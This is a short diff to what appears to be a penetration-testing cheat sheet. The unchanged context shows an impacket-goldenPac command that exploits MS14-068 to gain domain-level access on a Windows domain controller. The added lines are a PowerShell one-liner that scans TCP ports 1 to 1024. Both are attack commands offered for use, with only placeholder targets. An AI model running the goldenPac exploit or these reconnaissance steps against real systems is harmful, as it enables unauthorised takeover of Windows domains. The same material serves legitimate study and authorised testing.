@@ -58,3 +58,10 @@ GoldenPAC ms14-068
 ```bash
 impacket-goldenPac -dc-ip $TARGET_IP -target-ip $TARGET_IP '$DOMAIN/$USER:$PASSWORD@$MACHINE.$DOMAIN'
 ```
+
+Port scanning from PowerShell:
+
+
+```powershell
+foreach ($port in 1..1024){If(($a=Test-NetConnection 127.0.0.1 -Port $port -WarningAction SilentlyContinue).TcpTestSucceeded -eq $true){"TCP port $port is open"}}
+```
